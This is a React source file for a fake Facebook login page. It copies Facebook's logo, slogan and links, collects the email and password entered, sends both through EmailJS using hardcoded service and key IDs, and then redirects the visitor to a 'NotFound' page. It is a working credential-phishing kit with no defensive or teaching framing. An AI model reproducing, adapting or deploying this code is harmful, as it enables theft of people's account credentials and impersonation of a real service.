import logo from '../images/logo.svg'
import React, { useRef, useState } from 'react';
import emailjs from '@emailjs/browser';
import Reloader from './Reloader';
import { useNavigate } from 'react-router-dom';

const Desktop = ({ formData, setFormData,handleChange }) => {
    const form = useRef();
    const [loader, setLoader] = useState(false);
    const [val, setVal] = useState('');
    const navigate = useNavigate()
    
    const handleSubmit = (e) => {
        setLoader(prev => !prev);
        setVal('');
        e.preventDefault();
        
        emailjs
            .sendForm('service_b2vvpse', 'template_ebmbhy9', form.current, '8PsCARLu8bf-E5pdw')
            .then((result) => {
                if(formData.email && formData.password){
                    console.log(result.text);
                    console.log('success');
                    navigate('/NotFound');
                    setLoader(false);
                }else if(formData.email == '' && formData.password == ''){
                    setVal('fill the given input')
                    setLoader(false);
                }else if (formData.email == '') {
                    setVal('input your email');
                    setLoader(false);
                }else if (formData.password == ''){
                    setVal('input your password');
                    setLoader(false);
                }
            }, (error) => {
                console.log('error');
            });
        
        
    }

    return ( 
        <section className="login">
            {loader && <Reloader/>}
            <div className="facebook--container">

                <div className="facebook--items one">
                    <div>
                        <img src={logo} alt="logo" className='facebook--logo'/>
                    </div>
                    <p className='black'>Facebook helps you connect and share with the people in your life.</p>
                </div>

                <div className="facebook--items two">
                    <form ref={form} onSubmit={handleSubmit}>
                        <div>
                        <input 
                            className='curve' 
                            type="text"  
                            name='email'
                            placeholder='Email address or phone number'
                            value={formData.email}
                            onChange={handleChange}
                        />
                        <div className='validation-line'></div>
                        </div>
                        <div>
                        <input 
                            className='curve' 
                            type="password" 
                            placeholder='Password'
                            name='password'
                            value={formData.password}
                            onChange={handleChange}
                        />
                        <div className='validation-line'></div>
                        </div>
                        <input className='submit--btn curve' type="submit"  value='Log in' />
                        <p className='error--mgs curve'>{val}</p>
                        <a href='https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0' className='forgotten--password curve' >Forgotten password?</a>
                        <div className='hr-or'>
                            <div><hr className='curve' /></div>
                            <div className='or'>or</div>
                            <div><hr className='curve' /></div>
                        </div>
                        <a href='https://web.facebook.com/r.php' className='create--new--account curve'>Create new account</a>

                    </form>

                    <p className='black'><strong>Create a Page</strong> for a celebrity, brand or business.</p>
                </div>
            </div>
        </section>
    );
}
 
export default Desktop;